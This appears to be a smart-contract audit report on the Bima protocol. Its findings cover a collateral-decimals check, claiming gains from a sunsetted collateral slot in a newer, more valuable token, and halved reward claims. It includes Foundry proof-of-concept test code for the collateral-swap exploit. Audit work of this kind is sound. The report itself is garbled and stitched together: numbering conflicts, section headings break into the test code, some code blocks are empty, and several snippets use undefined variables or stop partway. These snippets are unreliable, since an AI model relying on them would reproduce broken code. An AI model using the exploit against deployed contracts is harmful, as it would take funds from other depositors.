# 2 - Users Can Easily Obtain New Collateral by Leveraging Sunsetted Collateral

**Severity:** medium
**Auditor:** Cantina
**Protocol:** Bima 
**Keywords:** collateral, sunsetted, gains, claimReward, exploitation, value, defer, claim, offset, StabilityPool, functionality, users, reward, gainsByDepositor, transfer, tokens, price, collateralTokens, disproportionate, profits

---

# 1. Invalid Collateral Decimals
The following line of code creates a critical limitation:

\u0060\u0060\u0060solidity
require(collateralToken.decimals() == BIMA_COLLATERAL_DECIMALS, "Invalid collateral decimals");
\u0060\u0060\u0060

Where \u0060BIMA_COLLATERAL_DECIMALS\u0060 is set to 18. This creates a critical limitation as it prevents the use of major Bitcoin-based ERC20 tokens that the protocol intends to support, since most Bitcoin tokens on EVM chains use 8 decimals to match WBTC\u0027s decimal format:

- WBTC (Wrapped Bitcoin): 8 decimals.
- CbBTC (Coinbase Wrapped BTC): 8 decimals.
- UniBTC: 8 decimals.
- Other BTC based tokens typically follow the 8 decimal standard.

Here is some more proof that the above tokens were meant to be supported:

1. The docs explicitly state "users lock their assets (e.g., BTC, LST) in exchange for USBD".
2. The testnet deployment on optimism sepolia is using a collateral aBTC that has 8 decimals.
3. The protocol developer stated that the protocol intends to support these tokens.

This mismatch between the intended collateral types and the decimal requirement creates a significant issue as it means the protocol cannot actually support the Bitcoin-based collateral that it was designed for. This severely limits the protocol\u0027s functionality and prevents it from serving its core purpose of providing BTC-backed stablecoin loans.

**Recommendation:** The decimal check should be removed.

## 2. Users Can Easily Obtain New Collateral by Leveraging Sunsetted Collateral
Submitted by etherSky, also found by santipu, T1MOH and pkqs90  
**Severity:** Medium Risk  
**Context:** (No context files were provided by the reviewer)  
**Summary:** Certain collaterals may be sunsetted by the owner. After 180 days, these sunsetted collaterals can be replaced by newly added ones. Users can claim the new collateral using the gains from their old sunsetted collateral. This could pose a significant problem if the newly added collateral is much more valuable than the old one.

**Finding Description:** Suppose there is a collateral priced at 1 USD. A user gains 100 units of this collateral through offset but doesn’t immediately claim the rewards. Instead, they update their collateral GainsByDepositor by calling the claimReward function without actually claiming the gains. This allows the user to defer the claim and retrieve these gains at any time in the future. Suppose a collateral is sunsetted, and 180 days have passed.

\u0060\u0060\u0060solidity
// StabilityPool.sol#L241:
\u0060\u0060\u0060
## Code Snippet
\u0060\u0060\u0060solidity
function _overwriteCollateral(IERC20 _newCollateral, uint256 idx) internal {
    require(indexByCollateral[_newCollateral] == 0, "Collateral must be sunset");
    uint256 length = collateralTokens.length;
    require(idx < length, "Index too large");
    indexByCollateral[_newCollateral] = idx + 1;
    collateralTokens[idx] = _newCollateral;
}
\u0060\u0060\u0060

Before new collateral is added, the user checks its price. If the price of the new collateral is lower than the old one, they immediately claim their old gains. However, if the price of the new collateral is significantly higher (e.g., 1,000 USD), they delay claiming their old gains and wait for the new collateral to accumulate. During some period, the new collateral is transferred to the Stability Pool through offsets. Once sufficient new collateral is gathered, the user claims their gains, but now in terms of the new, more expensive collateral.

## Code Snippet
\u0060\u0060\u0060solidity
function claimCollateralGains(address recipient, uint256[] calldata collateralIndexes) external {
    claimReward(recipient);
    uint256[] memory collateralGains = new uint256[](collateralTokens.length);
    uint80[MAX_COLLATERAL_COUNT] storage depositorGains = collateralGainsByDepositor[msg.sender];
    for (uint256 i; i < collateralIndexes.length; ) {
        uint256 collateralIndex = collateralIndexes[i];
        uint256 gains = depositorGains[collateralIndex];
        if (gains > 0) {
            collateralGains[collateralIndex] = gains;
            depositorGains[collateralIndex] = 0;
            collateralTokens[collateralIndex].safeTransfer(recipient, gains);
        }
        unchecked {
            ++i;
        }
    }
}
\u0060\u0060\u0060

This creates a serious issue because the user\u0027s gains, which should have been worth 100 USD (e.g., 100 units of the old collateral at 1 USD each), are now received as 100 units of the new collateral, valued at 1,000 USD each. This results in a total gain of 100,000 USD, which is disproportionately higher than the original value.

The initial collateral gain of User1 = >  1000000000000000000  
The current collateral gain of User1 = >  1000000000000000000  
*************  
The balance of the new Collateral before claim => 0  
The balance of the new Collateral after claim => 1000000000000000000  

Users could exploit this mechanism to gain extraordinary rewards, which rightfully belong to other depositors.

The sunsetting process is one part of the system design. Also, the prices of collaterals vary. Furthermore, the attackers incur no losses.

Please add the following test file to the test/foundry directory:
\u0060\u0060\u0060solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;
import {TestSetup, IIncentiveVoting, SafeCast} from "./TestSetup.sol";
import {StakedBTC} from "../../contracts/mock/StakedBTC.sol";
import {Factory, IFactory} from "../../contracts/core/Factory.sol";
import {PriceFeed} from "../../contracts/core/PriceFeed.sol";
\u0060\u0060\u0060
\u0060\u0060\u0060solidity
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "forge-std/console2.sol";

contract TestStabilityPoolTest1 is TestSetup {
    function setUp() public virtual override {
        super.setUp();
        /**
            only 1 collateral token exists due to base setup.
        */
        assertEq(stabilityPool.getNumCollateralTokens(), 1);
        /**
            The collateral token is stakedBTC.
        */
        assertEq(address(stabilityPool.collateralTokens(0)), address(stakedBTC));
    }
    
    function test_stabilityPool_sunset() external {
        uint256 depositAmount = 20e18;
        vm.prank(address(borrowerOps));
        debtToken.mint(users.user1, depositAmount);
        assertEq(debtToken.balanceOf(users.user1), depositAmount);
        vm.prank(users.user1);
        /**
            User1 provides debtTokens to the Stability Pool.
        */
        stabilityPool.provideToSP(depositAmount);
        vm.prank(address(liquidationMgr));
        /**
            For testing purposes:
                - A 1e18 debt loss occurs.
                - A 1e18 collateral gain is applied.
        */
        stabilityPool.offset(stakedBTC, 1e18, 1e18);
        vm.prank(users.owner);
        /**
            The stakedBTC collateral is sunsetted.
        */
        stabilityPool.startCollateralSunset(stakedBTC);
        /**
            After 200 days, the stakedBTC can be replaced with new collateral.
        */
        vm.warp(block.timestamp + 200 days);
        /**
            The initial collateral gain of User1: 1000000000000000000
        */
        uint256[] memory collateralGains_1 = stabilityPool.getDepositorCollateralGain(users.user1);
        console2.log(\u0027The initial collateral gain of User1 = > \u0027, collateralGains_1[0]);
        vm.prank(users.user1);
        /**
            To update collateralGainsByDepositor, User1 calls the claimReward function.
        */
        stabilityPool.claimReward(users.user1);
        vm.prank(users.owner);
        StakedBTC newCollateral = new StakedBTC();
        vm.prank(address(factory));
        /**
            A new collateral token is enabled. (Suppose this new collateral is much more valuable than
            ֒→  stakedBTC.)
        */
        stabilityPool.enableCollateral(newCollateral);
        vm.prank(users.owner);
        /**
            For testing purposes, transfer some of the new collateral to the Stability Pool.
            In real scenarios, these tokens are typically collected through offsets.
\u0060\u0060\u0060
## Vulnerability 1: Collateral Gain Calculation

\u0060\u0060\u0060solidity
newCollateral.transfer(address(stabilityPool), 1e18);
\u0060\u0060\u0060

The current collateral gain of User1 remains unchanged.

\u0060\u0060\u0060solidity
uint256[] memory collateralGains_3 = stabilityPool.getDepositorCollateralGain(users.user1);
console2.log(\u0027The current collateral gain of User1 = > \u0027, collateralGains_3[0]);
console2.log(\u0027*************\u0027);
\u0060\u0060\u0060

The balance of the new Collateral before claim: 0

\u0060\u0060\u0060solidity
console2.log(\u0027The balance of the new Collateral before claim => \u0027, newCollateral.balanceOf(users.user1));
\u0060\u0060\u0060

\u0060\u0060\u0060solidity
uint256[] memory collateralIndexes = new uint256[](1);
collateralIndexes[0] = 0;
vm.prank(users.user1);
\u0060\u0060\u0060

User1 claims their collateral.

\u0060\u0060\u0060solidity
stabilityPool.claimCollateralGains(users.user1, collateralIndexes);
\u0060\u0060\u0060

The balance of the new Collateral after claim: 1000000000000000000

\u0060\u0060\u0060solidity
console2.log(\u0027The balance of the new Collateral after claim => \u0027, newCollateral.balanceOf(users.user1));
\u0060\u0060\u0060

User1 could receive the same amount of new collateral in place of the old collateral. If the new collateral is significantly more valuable than the old collateral, this could result in undeserved profits for User1.

Track collateral gains per collateral instead of index.

\u0060\u0060\u0060solidity
- mapping(address depositor => uint80[MAX_COLLATERAL_COUNT] gains) public collateralGainsByDepositor;
+ mapping(address depositor => mapping(IERC20 => uint80) gains) public collateralGainsByDepositor;
\u0060\u0060\u0060

## Vulnerability 2: Incorrect Reward Calculation in Curve and Convex Deposit Tokens

BIMA tokens are emitted weekly and distributed to registered receivers, including CurveDepositToken and ConvexDepositToken. Depositors of CurveDepositToken are eligible to receive BIMA tokens as rewards. While the calculation for claimable rewards is accurate, the actual claimed rewards may be calculated incorrectly in the boost calculator if the weekly emissions for the current week are not properly updated in the vault.

In the \u0060_getBoostedAmount\u0060 function of the BoostCalculator, the total weekly emissions value plays a crucial role in calculating the boosted amount.

\u0060\u0060\u0060solidity
• BoostCalculator.sol#L264:
\u0060\u0060\u0060
The function \u0060_getBoostedAmount\u0060 is designed to adjust the amount based on various parameters. However, if \u0060totalWeeklyEmissions\u0060 is 0, the claimed amount defaults to the unboosted value, which is half of the original amount. This is illustrated in the following code snippet:

\u0060\u0060\u0060solidity
function _getBoostedAmount(
    uint256 amount,
    uint256 previousAmount,
    uint256 totalWeeklyEmissions,
    uint256 pct
) internal pure returns (uint256 adjustedAmount) {
    if (pct == NO_LOCK_WEIGHT) return amount / 2;
    uint256 total = amount + previousAmount;
    uint256 maxBoostable = (totalWeeklyEmissions * pct) / BIMA_SCALE_FACTOR;
    uint256 fullDecay = maxBoostable * 2;
    if (maxBoostable >= total) return amount;
    if (fullDecay <= previousAmount) return amount / 2;
}
\u0060\u0060\u0060

When depositors claim their rewards in \u0060CurveDepositToken\u0060, the \u0060claimReward\u0060 function is called, triggering the \u0060transferAllocatedTokens\u0060 function in the Vault:

\u0060\u0060\u0060solidity
function claimReward(address receiver) external returns (uint256 bimaAmount, uint256 crvAmount) {
    uint128[2] memory amounts = _claimReward(msg.sender, receiver);
    vault.transferAllocatedTokens(msg.sender, receiver, amounts[0]);
    bimaAmount = amounts[0];
    crvAmount = amounts[1];
}
\u0060\u0060\u0060

Within the \u0060_transferAllocated\u0060 function, the claimed amount is recalculated using the \u0060BoostCalculator\u0060:

\u0060\u0060\u0060solidity
function _transferAllocated(
    uint256 maxFeePct,
    address account,
    address receiver,
    address boostDelegate,
    uint256 amount
) internal {
    if (amount > 0) {
        uint256 week = getWeek();
        uint256 totalWeekly = weeklyEmissions[week];
        uint256 adjustedAmount = boostCalculator.getBoostedAmountWrite(
            claimant,
            amount,
            previousAmount,
            totalWeekly
        );
        _transferOrLock(account, receiver, adjustedAmount);
    }
}
\u0060\u0060\u0060

Inline, \u0060totalWeekly\u0060 is set to the \u0060weeklyEmissions\u0060 of the current week. This value is crucial as it is used in the boost calculation. As mentioned earlier, if \u0060totalWeekly\u0060 is mistakenly set to 0, the \u0060BoostCalculator\u0060 will always return half of the original amount as the claimed reward. The \u0060totalWeekly\u0060 for the current week is updated in the \u0060_allocateTotalWeekly\u0060 function, which is invoked by the \u0060allocateNewEmissions\u0060 function.
## Vulnerability Overview

The following code snippet illustrates a potential vulnerability in the allocation of emissions in a smart contract:

\u0060\u0060\u0060solidity
function _allocateTotalWeekly(IEmissionSchedule _emissionSchedule, uint256 currentWeek) internal {
    uint256 week = totalUpdateWeek;
    if (week >= currentWeek) return;
    while (week < currentWeek) {
        ++week;
        (weeklyAmount, lock) = _emissionSchedule.getTotalWeeklyEmissions(week, unallocated);
        weeklyEmissions[week] = SafeCast.toUint128(weeklyAmount);
    }
}

function allocateNewEmissions(uint256 id) external returns (uint256 amount) {
    uint256 currentWeek = getWeek();
    if (receiver.updatedWeek != currentWeek) {
        IEmissionSchedule _emissionSchedule = emissionSchedule;
        _allocateTotalWeekly(_emissionSchedule, currentWeek);
    }
}
\u0060\u0060\u0060

Therefore, it is essential to call the \u0060allocateNewEmissions\u0060 function before executing the \u0060transferAllocatedTokens\u0060 function to ensure accurate reward calculations. For instance, in the \u0060TroveManager\u0060, the \u0060allocateNewEmissions\u0060 function is consistently called before the \u0060transferAllocatedTokens\u0060 function. This ensures that the \u0060weeklyEmissions\u0060 for the current week is updated correctly before boosted reward calculation.

However, in \u0060CurveDepositToken\u0060, there is no such guarantee. The calls to \u0060allocateNewEmissions\u0060 and \u0060transferAllocatedTokens\u0060 are independent, leading to a potential issue where the \u0060weeklyEmissions\u0060 of the current week might not be updated properly before claiming rewards. 

In the proof of concept below, if users attempt to claim rewards without updating the \u0060weeklyEmissions\u0060 for the current week (i.e., when this value is 0), the claimed rewards will be half of the actual claimable rewards.

- The claimable rewards in \u0060curveDepositToken\u0060 are =>  1637875711618652343750000000
- The claimed rewards without updating the \u0060weeklyEmissions\u0060 for the current week => 818937855809326171875000000

Conversely, if the \u0060weeklyEmissions\u0060 of the current week is updated correctly before claiming, users can claim more rewards.

- The claimable rewards in \u0060curveDepositToken\u0060 are =>  1637875711618652343750000000
- The claimed rewards after updating the \u0060weeklyEmissions\u0060 for the current week => 914489343787078857421875000

Clearly, the impact is a loss of rewards for users.

This issue can occur easily.

Please add the following test file to the \u0060test/foundry\u0060 directory.

\u0060\u0060\u0060solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;
import {TestSetup, IIncentiveVoting} from "./TestSetup.sol";
import {ICurveProxy} from "./../../contracts/interfaces/ICurveProxy.sol";
import {IEmissionReceiver} from "./../../contracts/interfaces/IEmissionReceiver.sol";
import {IBimaVault} from "./../../contracts/interfaces/IVault.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "forge-std/console2.sol";

contract MockCurveDepositToken is IEmissionReceiver {
    IBimaVault public immutable vault;
    uint256 public emissionId;
    uint256 public claimableRewards;

    constructor(IBimaVault _vault) {
        vault = _vault;
    }
}
\u0060\u0060\u0060
